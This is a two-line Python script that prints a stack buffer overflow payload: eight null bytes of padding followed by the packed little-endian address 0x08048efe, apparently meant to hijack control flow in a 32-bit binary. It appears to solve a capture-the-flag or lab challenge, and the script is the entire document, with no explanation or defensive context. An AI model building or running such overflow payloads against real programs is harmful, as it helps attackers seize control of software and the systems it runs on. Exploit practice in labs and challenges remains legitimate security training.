from struct import pack

print("\x00"*8 + pack("<I", 0x08048efe))
